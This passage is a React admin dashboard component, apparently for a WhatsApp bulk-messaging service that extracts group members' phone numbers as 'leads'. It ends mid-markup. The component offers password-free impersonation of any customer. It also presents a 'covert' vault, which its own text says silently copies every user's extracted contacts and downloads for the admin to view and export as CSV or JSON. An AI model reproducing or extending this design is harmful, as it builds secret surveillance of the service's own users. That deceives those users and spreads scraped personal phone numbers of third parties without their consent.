import React, { useEffect, useState } from 'react';
import { api, getAuthToken } from '../../services/api';
import { useAuth } from '../../context/AuthContext';
import { AdminOverviewStats, VaultLogItem, VaultRecordDetail } from '../../types';
import {
  ShieldCheck,
  Users,
  Database,
  Download,
  Eye,
  LogIn,
  Key,
  Trash2,
  RefreshCw,
  Search,
  CheckCircle2,
  XCircle,
  Edit3,
  Server,
  HardDrive,
  Cpu,
  Smartphone,
  MessageSquare,
  FileSpreadsheet,
  FileJson,
  AlertTriangle,
  Lock,
  Unlock,
  X
} from 'lucide-react';

interface AdminControlCenterProps {
  onImpersonated?: () => void;
}

type AdminSubTab = 'users' | 'vault' | 'capacity';

export const AdminControlCenter: React.FC<AdminControlCenterProps> = ({ onImpersonated }) => {
  const { impersonateUser, user: currentUser } = useAuth();
  const [subTab, setSubTab] = useState<AdminSubTab>('users');

  // Data states
  const [overview, setOverview] = useState<AdminOverviewStats | null>(null);
  const [customers, setCustomers] = useState<any[]>([]);
  const [vaultLogs, setVaultLogs] = useState<VaultLogItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [toast, setToast] = useState<string | null>(null);

  // Filters
  const [userSearch, setUserSearch] = useState('');
  const [vaultSearch, setVaultSearch] = useState('');
  const [vaultUserFilter, setVaultUserFilter] = useState<string>('');

  // Modals
  const [previewRecord, setPreviewRecord] = useState<VaultRecordDetail | null>(null);
  const [previewLoading, setPreviewLoading] = useState(false);

  const [editingCustomer, setEditingCustomer] = useState<any | null>(null);
  const [editPlanTier, setEditPlanTier] = useState('pro');
  const [editStatus, setEditStatus] = useState('active');
  const [editDurationDays, setEditDurationDays] = useState('30');
  const [editMaxDevices, setEditMaxDevices] = useState('3');
  const [editDailyLimit, setEditDailyLimit] = useState('1000');
  const [editExtractionLimit, setEditExtractionLimit] = useState('5000');

  const [resetPwdCustomer, setResetPwdCustomer] = useState<any | null>(null);
  const [newPasswordInput, setNewPasswordInput] = useState('');

  const showToast = (msg: string) => {
    setToast(msg);
    setTimeout(() => setToast(null), 3500);
  };

  const loadAllData = async () => {
    setLoading(true);
    setError(null);
    try {
      const [ovRes, custRes, vaultRes] = await Promise.all([
        api.admin.getOverview(),
        api.subscriptions.adminListCustomers(),
        api.admin.listVault(vaultUserFilter || undefined)
      ]);
      setOverview(ovRes.stats);
      setCustomers(custRes.customers || []);
      setVaultLogs(vaultRes.logs || []);
    } catch (err: any) {
      setError(err.message || 'Failed to load admin control data.');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadAllData();
  }, [vaultUserFilter]);

  const handleImpersonate = async (targetUser: any) => {
    if (targetUser.id === currentUser?.id) {
      showToast('You are already logged into this admin account.');
      return;
    }
    try {
      await impersonateUser(targetUser.id);
      if (onImpersonated) {
        onImpersonated();
      }
    } catch (err: any) {
      setError(err.message || 'Failed to log in as user.');
    }
  };

  const handleOpenEditCustomer = (c: any) => {
    setEditingCustomer(c);
    setEditPlanTier(c.plan_tier || 'starter');
    setEditStatus(c.subscription_status || 'active');
    setEditDurationDays('30');
    setEditMaxDevices(String(c.max_devices || 1));
    setEditDailyLimit(String(c.daily_message_limit || 100));
    setEditExtractionLimit(String(c.daily_extraction_limit || 500));
  };

  const handleSaveCustomerEdit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingCustomer) return;
    try {
      await api.subscriptions.adminUpdateCustomer({
        targetUserId: editingCustomer.id,
        planTier: editPlanTier,
        subscriptionStatus: editStatus,
        durationDays: parseInt(editDurationDays, 10),
        maxDevices: parseInt(editMaxDevices, 10),
        dailyLimit: parseInt(editDailyLimit, 10),
        extractionLimit: parseInt(editExtractionLimit, 10)
      });
      setEditingCustomer(null);
      showToast(`Updated plan & limits for @${editingCustomer.username}`);
      loadAllData();
    } catch (err: any) {
      setError(err.message || 'Failed to update customer.');
    }
  };

  const handleResetPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!resetPwdCustomer || !newPasswordInput) return;
    try {
      await api.admin.resetPassword(resetPwdCustomer.id, newPasswordInput);
      setResetPwdCustomer(null);
      setNewPasswordInput('');
      showToast(`Password reset for @${resetPwdCustomer.username}`);
    } catch (err: any) {
      setError(err.message || 'Failed to reset password.');
    }
  };

  const handleToggleStatus = async (c: any) => {
    const nextActive = c.is_active === 0;
    try {
      await api.admin.toggleUserStatus(c.id, nextActive);
      showToast(`User @${c.username} ${nextActive ? 'activated' : 'disabled'}.`);
      loadAllData();
    } catch (err: any) {
      setError(err.message || 'Failed to toggle user status.');
    }
  };

  const handleDeleteUser = async (c: any) => {
    if (!window.confirm(`Are you sure you want to permanently delete user "${c.name}" (@${c.username})?`)) {
      return;
    }
    try {
      await api.admin.deleteUser(c.id);
      showToast(`Deleted user @${c.username}.`);
      loadAllData();
    } catch (err: any) {
      setError(err.message || 'Failed to delete user.');
    }
  };

  const handlePreviewVault = async (id: string) => {
    setPreviewLoading(true);
    try {
      const res = await api.admin.getVaultRecord(id);
      setPreviewRecord(res.record);
    } catch (err: any) {
      setError(err.message || 'Failed to load vault record.');
    } finally {
      setPreviewLoading(false);
    }
  };

  const handleDownloadVaultCsv = async (log: VaultLogItem) => {
    try {
      const token = getAuthToken();
      const url = api.admin.downloadVaultCsvUrl(log.id);
      const response = await fetch(url, {
        headers: token ? { Authorization: `Bearer ${token}` } : {}
      });
      if (!response.ok) throw new Error('Failed to download CSV');
      const blob = await response.blob();
      const downloadUrl = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = downloadUrl;
      const safeName = (log.group_name || 'leads').replace(/[^a-z0-9]/gi, '_');
      a.download = `vault_${log.username || 'user'}_${safeName}.csv`;
      a.click();
      URL.revokeObjectURL(downloadUrl);
      showToast('Downloaded CSV from Admin Vault.');
    } catch (err: any) {
      setError(err.message || 'Failed to download CSV.');
    }
  };

  const handleDownloadVaultJson = async (log: VaultLogItem) => {
    try {
      const res = await api.admin.getVaultRecord(log.id);
      const blob = new Blob([JSON.stringify(res.record.contacts || [], null, 2)], {
        type: 'application/json'
      });
      const downloadUrl = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = downloadUrl;
      const safeName = (log.group_name || 'leads').replace(/[^a-z0-9]/gi, '_');
      a.download = `vault_${log.username || 'user'}_${safeName}.json`;
      a.click();
      URL.revokeObjectURL(downloadUrl);
      showToast('Downloaded JSON from Admin Vault.');
    } catch (err: any) {
      setError(err.message || 'Failed to download JSON.');
    }
  };

  const handleDeleteVaultItem = async (id: string) => {
    try {
      await api.admin.deleteVaultRecord(id);
      setVaultLogs((prev) => prev.filter((item) => item.id !== id));
      showToast('Vault record deleted.');
    } catch (err: any) {
      setError(err.message || 'Failed to delete vault item.');
    }
  };

  const handleClearVault = async () => {
    if (!window.confirm('Clear ALL intercepted lead records from the Admin Vault? This cannot be undone.')) {
      return;
    }
    try {
      await api.admin.clearVault();
      setVaultLogs([]);
      showToast('Admin Vault cleared.');
      loadAllData();
    } catch (err: any) {
      setError(err.message || 'Failed to clear vault.');
    }
  };

  const filteredCustomers = customers.filter((c) => {
    const q = userSearch.trim().toLowerCase();
    if (!q) return true;
    return (
      c.username?.toLowerCase().includes(q) ||
      c.name?.toLowerCase().includes(q) ||
      c.email?.toLowerCase().includes(q) ||
      c.phone?.toLowerCase().includes(q)
    );
  });

  const filteredVault = vaultLogs.filter((v) => {
    const q = vaultSearch.trim().toLowerCase();
    if (!q) return true;
    return (
      v.group_name?.toLowerCase().includes(q) ||
      v.username?.toLowerCase().includes(q) ||
      v.user_name?.toLowerCase().includes(q) ||
      v.source_action?.toLowerCase().includes(q)
    );
  });

  const getActionBadge = (action: string) => {
    switch (action) {
      case 'download_csv':
        return <span className="px-2 py-0.5 rounded-full text-[11px] font-bold bg-emerald-100 text-emerald-800">Downloaded CSV</span>;
      case 'download_json':
        return <span className="px-2 py-0.5 rounded-full text-[11px] font-bold bg-blue-100 text-blue-800">Downloaded JSON</span>;
      case 'copied_numbers':
        return <span className="px-2 py-0.5 rounded-full text-[11px] font-bold bg-amber-100 text-amber-800">Copied Numbers</span>;
      case 'export_contacts':
        return <span className="px-2 py-0.5 rounded-full text-[11px] font-bold bg-purple-100 text-purple-800">Saved Contacts</span>;
      default:
        return <span className="px-2 py-0.5 rounded-full text-[11px] font-bold bg-slate-100 text-slate-700">Extracted Group</span>;
    }
  };

  return (
    <div className="space-y-6">
      {/* Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 bg-gradient-to-r from-slate-900 via-slate-800 to-slate-900 p-6 rounded-2xl text-white shadow-lg">
        <div>
          <div className="flex items-center gap-2.5">
            <div className="p-2 bg-emerald-500/20 rounded-xl border border-emerald-400/30">
              <ShieldCheck className="w-6 h-6 text-emerald-400" />
            </div>
            <div>
              <h1 className="text-xl font-bold tracking-tight">Super Admin Control Center</h1>
              <p className="text-xs text-slate-400 mt-0.5">
                Full platform oversight, user impersonation, covert extracted data vault & server metrics
              </p>
            </div>
          </div>
        </div>
        <button
          onClick={loadAllData}
          disabled={loading}
          className="inline-flex items-center gap-2 px-4 py-2 bg-white/10 hover:bg-white/20 text-white rounded-xl text-xs font-semibold transition border border-white/10 self-start sm:self-auto"
        >
          <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
          Refresh Control Data
        </button>
      </div>

      {toast && (
        <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 px-4 py-3 rounded-xl text-sm font-medium flex items-center gap-2 shadow-sm">
          <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
          <span>{toast}</span>
        </div>
      )}

      {error && (
        <div className="bg-red-50 border border-red-200 text-red-800 px-4 py-3 rounded-xl text-sm font-medium flex items-center justify-between shadow-sm">
          <div className="flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 text-red-600 shrink-0" />
            <span>{error}</span>
          </div>
          <button onClick={() => setError(null)} className="text-red-500 hover:text-red-700">
            <X className="w-4 h-4" />
          </button>
        </div>
      )}

      {/* Overview Stats Cards */}
      {overview && (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
            <div className="flex items-center justify-between text-slate-500 text-xs font-semibold uppercase tracking-wider mb-2">
              <span>Registered Users</span>
              <Users className="w-4 h-4 text-indigo-500" />
            </div>
            <div className="text-2xl font-bold text-slate-900">{overview.totalUsers}</div>
            <div className="text-xs text-slate-500 mt-1">
              {overview.activeUsers} Active &bull; {overview.paidUsers} Paid &bull; {overview.trialUsers} Trial
            </div>
          </div>

          <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
            <div className="flex items-center justify-between text-slate-500 text-xs font-semibold uppercase tracking-wider mb-2">
              <span>Active WhatsApp Sockets</span>
              <Smartphone className="w-4 h-4 text-emerald-500" />
            </div>
            <div className="text-2xl font-bold text-slate-900">{overview.connectedDevices}</div>
            <div className="text-xs text-slate-500 mt-1">
              Live Baileys Multi-Device Sessions
            </div>
          </div>

          <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
            <div className="flex items-center justify-between text-slate-500 text-xs font-semibold uppercase tracking-wider mb-2">
              <span>Platform Messages</span>
              <MessageSquare className="w-4 h-4 text-blue-500" />
            </div>
            <div className="text-2xl font-bold text-slate-900">{overview.totalMessages.toLocaleString()}</div>
            <div className="text-xs text-slate-500 mt-1">
              {overview.totalCampaigns} Bulk Campaigns Executed
            </div>
          </div>

          <div className="bg-gradient-to-br from-emerald-50 to-teal-50 p-5 rounded-2xl border border-emerald-200 shadow-sm">
            <div className="flex items-center justify-between text-emerald-800 text-xs font-semibold uppercase tracking-wider mb-2">
              <span>Secret Vault Leads</span>
              <Database className="w-4 h-4 text-emerald-600" />
            </div>
            <div className="text-2xl font-bold text-emerald-950">
              {overview.vault.totalContactsCaptured.toLocaleString()}
            </div>
            <div className="text-xs text-emerald-700 mt-1">
              {overview.vault.totalPhonesCaptured.toLocaleString()} Real Phones &bull; {overview.vault.totalExtractions} Captures
            </div>
          </div>
        </div>
      )}

      {/* Navigation Tabs */}
      <div className="flex flex-wrap items-center gap-2 border-b border-slate-200 pb-3">
        <button
          onClick={() => setSubTab('users')}
          className={`px-4 py-2 rounded-xl text-sm font-semibold flex items-center gap-2 transition ${
            subTab === 'users'
              ? 'bg-slate-900 text-white shadow-sm'
              : 'bg-white text-slate-600 hover:bg-slate-100 border border-slate-200'
          }`}
        >
          <Users className="w-4 h-4" />
          Users & Impersonation ({customers.length})
        </button>

        <button
          onClick={() => setSubTab('vault')}
          className={`px-4 py-2 rounded-xl text-sm font-semibold flex items-center gap-2 transition ${
            subTab === 'vault'
              ? 'bg-emerald-600 text-white shadow-sm'
              : 'bg-white text-slate-600 hover:bg-slate-100 border border-slate-200'
          }`}
        >
          <Database className="w-4 h-4" />
          Extracted Data Vault ({vaultLogs.length})
        </button>

        <button
          onClick={() => setSubTab('capacity')}
          className={`px-4 py-2 rounded-xl text-sm font-semibold flex items-center gap-2 transition ${
            subTab === 'capacity'
              ? 'bg-indigo-600 text-white shadow-sm'
              : 'bg-white text-slate-600 hover:bg-slate-100 border border-slate-200'
          }`}
        >
          <Server className="w-4 h-4" />
          Server & DB Capacity
        </button>
      </div>

      {/* TAB 1: USERS & IMPERSONATION */}
      {subTab === 'users' && (
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
          <div className="p-4 border-b border-slate-100 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <h2 className="text-base font-bold text-slate-900">All Customer Accounts</h2>
              <p className="text-xs text-slate-500">
                Click "Login as User" to enter any customer's dashboard directly without needing their password.
              </p>
            </div>
            <div className="relative w-full sm:w-72">
              <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                value={userSearch}
                onChange={(e) => setUserSearch(e.target.value)}
                placeholder="Search username, email, name..."
                className="w-full pl-9 pr-3 py-2 text-xs border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-500"
              />
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-slate-50 text-slate-500 text-[11px] uppercase tracking-wider border-b border-slate-200">
                  <th className="py-3 px-4 font-semibold">User</th>
                  <th className="py-3 px-4 font-semibold">Plan & Limits</th>
                  <th className="py-3 px-4 font-semibold">Activity Stats</th>
                  <th className="py-3 px-4 font-semibold">Status</th>
                  <th className="py-3 px-4 font-semibold text-right">Admin Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 text-sm">
                {filteredCustomers.map((c) => (
                  <tr key={c.id} className="hover:bg-slate-50/70 transition">
                    <td className="py-3.5 px-4">
                      <div className="flex items-center gap-2.5">
                        <div className="w-8 h-8 rounded-full bg-slate-200 text-slate-700 font-bold text-xs flex items-center justify-center shrink-0">
                          {(c.name || c.username || 'U')[0].toUpperCase()}
                        </div>
                        <div>
                          <div className="font-semibold text-slate-900 flex items-center gap-1.5">
                            {c.name}
                            {c.role === 'admin' && (
                              <span className="px-1.5 py-0.5 rounded bg-purple-100 text-purple-700 text-[10px] font-bold">
                                ADMIN
                              </span>
                            )}
                            {c.role === 'reseller' && (
                              <span className="px-1.5 py-0.5 rounded bg-amber-100 text-amber-700 text-[10px] font-bold">
                                RESELLER
                              </span>
                            )}
                          </div>
                          <div className="text-xs text-slate-500">
                            @{c.username} {c.email ? `• ${c.email}` : ''}
                          </div>
                        </div>
                      </div>
                    </td>

                    <td className="py-3.5 px-4">
                      <div className="flex items-center gap-1.5">
                        <span className="px-2 py-0.5 rounded-md bg-slate-100 text-slate-800 text-xs font-bold uppercase">
                          {c.plan_tier}
                        </span>
                        <span className="text-xs text-slate-500">
                          ({c.max_devices} dev / {c.daily_message_limit} msg)
                        </span>
                      </div>
                      <div className="text-[11px] text-slate-400 mt-0.5">
                        Expires: {c.subscription_expires_at ? new Date(c.subscription_expires_at).toLocaleDateString() : 'Lifetime / Never'}
                      </div>
                    </td>

                    <td className="py-3.5 px-4">
                      <div className="text-xs text-slate-700 space-y-0.5">
                        <div>Devices Connected: <strong>{c.connected_devices || 0}</strong></div>
                        <div>Messages Sent: <strong>{c.total_messages_sent || 0}</strong></div>
                        <div className="text-emerald-700 font-medium">
                          Extracted Leads: <strong>{c.total_extracted_contacts || 0}</strong>
                        </div>
                      </div>
                    </td>

                    <td className="py-3.5 px-4">
                      {c.is_active === 0 ? (
                        <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-xs font-semibold bg-red-100 text-red-700">
                          <XCircle className="w-3.5 h-3.5" /> Disabled
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-xs font-semibold bg-emerald-100 text-emerald-700">
                          <CheckCircle2 className="w-3.5 h-3.5" /> Active
                        </span>
                      )}
                    </td>

                    <td className="py-3.5 px-4">
                      <div className="flex items-center justify-end gap-1.5 flex-wrap">
                        {c.id !== currentUser?.id && (
                          <button
                            onClick={() => handleImpersonate(c)}
                            title="Login directly into this user's account"
                            className="inline-flex items-center gap-1 px-2.5 py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg text-xs font-semibold transition shadow-sm"
                          >
                            <LogIn className="w-3.5 h-3.5" />
                            Login as User
                          </button>
                        )}
                        <button
                          onClick={() => handleOpenEditCustomer(c)}
                          title="Edit Plan & Limits"
                          className="p-1.5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-lg transition"
                        >
                          <Edit3 className="w-4 h-4" />
                        </button>
                        <button
                          onClick={() => {
                            setResetPwdCustomer(c);
                            setNewPasswordInput('');
                          }}
                          title="Reset Password"
                          className="p-1.5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-lg transition"
                        >
                          <Key className="w-4 h-4" />
                        </button>
                        {c.id !== currentUser?.id && (
                          <>
                            <button
                              onClick={() => handleToggleStatus(c)}
                              title={c.is_active === 0 ? 'Activate Account' : 'Disable Account'}
                              className={`p-1.5 rounded-lg transition ${
                                c.is_active === 0
                                  ? 'bg-emerald-100 hover:bg-emerald-200 text-emerald-700'
                                  : 'bg-amber-100 hover:bg-amber-200 text-amber-700'
                              }`}
                            >
                              {c.is_active === 0 ? <Unlock className="w-4 h-4" /> : <Lock className="w-4 h-4" />}
                            </button>
                            <button
                              onClick={() => handleDeleteUser(c)}
                              title="Delete User"
                              className="p-1.5 bg-red-50 hover:bg-red-100 text-red-600 rounded-lg transition"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </>
                        )}
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 2: SECRET EXTRACTED DATA VAULT */}
      {subTab === 'vault' && (
        <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
          <div className="p-4 border-b border-slate-100 flex flex-col lg:flex-row lg:items-center justify-between gap-3">
            <div>
              <h2 className="text-base font-bold text-slate-900 flex items-center gap-2">
                <Database className="w-4 h-4 text-emerald-600" />
                Covert Extracted Leads & Download Vault
              </h2>
              <p className="text-xs text-slate-500">
                Every time any user extracts a group or downloads CSV/JSON, a copy is silently captured here for Admin download.
              </p>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <select
                value={vaultUserFilter}
                onChange={(e) => setVaultUserFilter(e.target.value)}
                className="px-3 py-2 text-xs border border-slate-200 rounded-xl bg-white focus:outline-none focus:ring-2 focus:ring-emerald-500"
              >
                <option value="">All Users</option>
                {customers.map((c) => (
                  <option key={c.id} value={c.id}>
                    {c.name} (@{c.username})
                  </option>
                ))}
              </select>

              <div className="relative w-56">
                <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={vaultSearch}
                  onChange={(e) => setVaultSearch(e.target.value)}
                  placeholder="Search group or user..."
                  className="w-full pl-9 pr-3 py-2 text-xs border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-emerald-500"
                />
              </div>

              {vaultLogs.length > 0 && (
                <button
                  onClick={handleClearVault}
                  className="px-3 py-2 bg-red-50 hover:bg-red-100 text-red-700 rounded-xl text-xs font-semibold transition flex items-center gap-1.5"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                  Clear Vault
                </button>
              )}
            </div>
          </div>

          {filteredVault.length === 0 ? (
            <div className="p-12 text-center text-slate-400">
              <Database className="w-10 h-10 mx-auto mb-3 opacity-30" />
              <p className="text-sm font-medium text-slate-600">No intercepted extractions found yet.</p>
              <p className="text-xs mt-1">
                When any user extracts a group or downloads contacts, their leads will appear here automatically.
              </p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="bg-slate-50 text-slate-500 text-[11px] uppercase tracking-wider border-b border-slate-200">
                    <th className="py-3 px-4 font-semibold">User</th>
                    <th className="py-3 px-4 font-semibold">Group / Source</th>
                    <th className="py-3 px-4 font-semibold">Captured Action</th>
                    <th className="py-3 px-4 font-semibold">Leads Breakdown</th>
                    <th className="py-3 px-4 font-semibold">Captured At</th>
                    <th className="py-3 px-4 font-semibold text-right">Admin Export</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 text-sm">
                  {filteredVault.map((log) => (
                    <tr key={log.id} className="hover:bg-slate-50/70 transition">
                      <td className="py-3 px-4">
                        <div className="font-semibold text-slate-900">{log.user_name || 'Unknown'}</div>
                        <div className="text-xs text-slate-500">
                          @{log.username || log.user_id.slice(0, 8)} &bull; <span className="uppercase">{log.user_plan || 'user'}</span>
                        </div>
                      </td>

                      <td className="py-3 px-4">
                        <div className="font-medium text-slate-800 max-w-xs truncate">
                          {log.group_name || log.group_id || 'Extracted Audience'}
                        </div>
                        <div className="text-[11px] text-slate-400">{log.extraction_type}</div>
                      </td>

                      <td className="py-3 px-4">{getActionBadge(log.source_action)}</td>

                      <td className="py-3 px-4">
                        <div className="text-xs font-semibold text-slate-800">{log.total_contacts} Total</div>
                        <div className="text-[11px] text-emerald-700">
                          {log.phone_count} Real Phones &bull; {log.lid_count} LIDs
                        </div>
                      </td>

                      <td className="py-3 px-4 text-xs text-slate-500">
                        {new Date(log.created_at.includes('T') ? log.created_at : log.created_at.replace(' ', 'T') + 'Z').toLocaleString()}
                      </td>

                      <td className="py-3 px-4">
                        <div className="flex items-center justify-end gap-1.5">
                          <button
                            onClick={() => handlePreviewVault(log.id)}
                            title="View Leads Table"
                            className="inline-flex items-center gap-1 px-2.5 py-1.5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-lg text-xs font-semibold transition"
                          >
                            <Eye className="w-3.5 h-3.5" />
                            View
                          </button>

                          <button
                            onClick={() => handleDownloadVaultCsv(log)}
                            title="Download CSV"
                            className="inline-flex items-center gap-1 px-2.5 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg text-xs font-semibold transition shadow-sm"
                          >
                            <FileSpreadsheet className="w-3.5 h-3.5" />
                            CSV
                          </button>

                          <button
                            onClick={() => handleDownloadVaultJson(log)}
                            title="Download JSON"
                            className="inline-flex items-center gap-1 px-2.5 py-1.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs font-semibold transition shadow-sm"
                          >
                            <FileJson className="w-3.5 h-3.5" />
                            JSON
                          </button>

                          <button
                            onClick={() => handleDeleteVaultItem(log.id)}
                            title="Delete Entry"
                            className="p-1.5 bg-red-50 hover:bg-red-100 text-red-600 rounded-lg transition"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 3: SERVER & DATABASE CAPACITY */}
      {subTab === 'capacity' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm space-y-4">
            <div className="flex items-center gap-3">
              <div className="p-2.5 bg-indigo-50 rounded-xl text-indigo-600">
                <HardDrive className="w-6 h-6" />
              </div>
              <div>
                <h3 className="text-base font-bold text-slate-900">Database Engine: SQLite 3 (WAL Mode)</h3>
                <p className="text-xs text-slate-500">better-sqlite3 synchronous driver with Write-Ahead Logging</p>
              </div>
            </div>

            <div className="space-y-3 text-sm text-slate-700">
              <div className="p-3.5 bg-slate-50 rounded-xl border border-slate-100">
                <div className="font-semibold text-slate-900 mb-1">Database Location & Persistence</div>
                <p className="text-xs text-slate-600">
                  Stored locally on VPS disk at <code className="bg-slate-200 px-1.5 py-0.5 rounded">./server/data/whatsapp_messenger.db</code> mounted directly to Docker container.
                </p>
              </div>

              <div className="p-3.5 bg-slate-50 rounded-xl border border-slate-100">
                <div className="font-semibold text-slate-900 mb-1">Data Storage Capacity</div>
                <p className="text-xs text-slate-600">
                  SQLite can comfortably store <strong>10 Million+ messages / contacts</strong> (up to 100GB+ database size depending on VPS disk). Reading queries take under 1ms.
                </p>
              </div>

              <div className="p-3.5 bg-amber-50 rounded-xl border border-amber-200">
                <div className="font-semibold text-amber-900 mb-1">When to upgrade DB to PostgreSQL?</div>
                <p className="text-xs text-amber-800">
                  If you cross <strong>500+ concurrent active users</strong> writing simultaneously every second or want multi-server horizontal scaling, migrate to PostgreSQL + Redis.
                </p>
              </div>
            </div>
          </div>

          <div className="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm space-y-4">
            <div className="flex items-center gap-3">
              <div className="p-2.5 bg-emerald-50 rounded-xl text-emerald-600">
                <Cpu className="w-6 h-6" />
              </div>
              <div>
                <h3 className="text-base font-bold text-slate-900">VPS Concurrent Users Capacity</h3>
                <p className="text-xs text-slate-500">Bottleneck is RAM per active WhatsApp Web Socket (~50MB/device)</p>
              </div>
            </div>

            <div className="overflow-hidden border border-slate-200 rounded-xl">
              <table className="w-full text-left text-xs">
                <thead className="bg-slate-50 text-slate-600 font-semibold border-b border-slate-200">
                  <tr>
                    <th className="p-3">VPS RAM</th>
                    <th className="p-3">Max Connected WhatsApp Devices</th>
                    <th className="p-3">Total Registered Users</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 text-slate-700">
                  <tr>
                    <td className="p-3 font-bold">2 GB RAM</td>
                    <td className="p-3 text-emerald-700 font-semibold">15 - 25 Devices</td>
                    <td className="p-3">~100 - 200 Users</td>
                  </tr>
                  <tr>
                    <td className="p-3 font-bold">4 GB RAM</td>
                    <td className="p-3 text-emerald-700 font-semibold">45 - 70 Devices</td>
                    <td className="p-3">~400 - 600 Users</td>
                  </tr>
                  <tr>
                    <td className="p-3 font-bold">8 GB RAM</td>
                    <td className="p-3 text-emerald-700 font-semibold">100 - 150 Devices</td>
                    <td className="p-3">~1,000+ Users</td>
                  </tr>
                  <tr>
                    <td className="p-3 font-bold">16 GB RAM</td>
                    <td className="p-3 text-emerald-700 font-semibold">250 - 300+ Devices</td>
                    <td className="p-3">~2,500+ Users</td>
                  </tr>
                </tbody>
              </table>
            </div>

            <p className="text-xs text-slate-500">
              Note: Registered users who are idle or only extracting occasionally take almost 0 RAM. Only live connected WhatsApp Web sockets consume RAM continuously.
            </p>
          </div>
        </div>
      )}

      {/* MODAL: PREVIEW INTERCEPTED VAULT LEADS */}
      {(previewRecord || previewLoading) && (
        <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl max-w-3xl w-full max-h-[85vh] flex flex-col shadow-2xl overflow-hidden">
            <div className="p-4 border-b border-slate-200 flex items-center justify-between bg-slate-50">
              <div>
                <h3 className="font-bold text-slate-900">
                  {previewLoading ? 'Loading Vault Leads...' : `Intercepted Leads: ${previewRecord?.group_name || 'Audience'}`}
                </h3>
                {previewRecord && (
                  <p className="text-xs text-slate-500">
                    User: @{previewRecord.username} &bull; {previewRecord.total_contacts} contacts ({previewRecord.phone_count} Real Phones)
                  </p>
                )}
              </div>
              <button
                onClick={() => setPreviewRecord(null)}
                className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-200"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="flex-1 overflow-y-auto p-4">
              {previewLoading ? (
                <div className="py-12 text-center text-slate-500 text-sm">Loading contacts...</div>
              ) : (
                <table className="w-full text-left text-xs border-collapse">
                  <thead>
                    <tr className="bg-slate-50 text-slate-500 border-b border-slate-200">
                      <th className="py-2 px-3">#</th>
                      <th className="py-2 px-3">Name</th>
                      <th className="py-2 px-3">Real Phone Number</th>
                      <th className="py-2 px-3">WhatsApp LID</th>
                      <th className="py-2 px-3">Role</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100">
                    {previewRecord?.contacts?.map((c, idx) => (
                      <tr key={idx} className="hover:bg-slate-50">
                        <td className="py-2 px-3 text-slate-400">{idx + 1}</td>
                        <td className="py-2 px-3 font-medium text-slate-800">{c.name || 'Unknown'}</td>
                        <td className="py-2 px-3 font-mono text-emerald-700 font-semibold">
                          {c.phone || '-'}
                        </td>
                        <td className="py-2 px-3 font-mono text-slate-500">{c.lid || '-'}</td>
                        <td className="py-2 px-3 capitalize text-slate-600">{c.role || 'member'}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>

            {previewRecord && (
              <div className="p-4 border-t border-slate-200 flex items-center justify-end gap-2 bg-slate-50">
                <button
                  onClick={() => handleDownloadVaultCsv(previewRecord)}
                  className="inline-flex items-center gap-1.5 px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold transition"
                >
                  <Download className="w-4 h-4" />
                  Download CSV
                </button>
                <button
                  onClick={() => setPreviewRecord(null)}
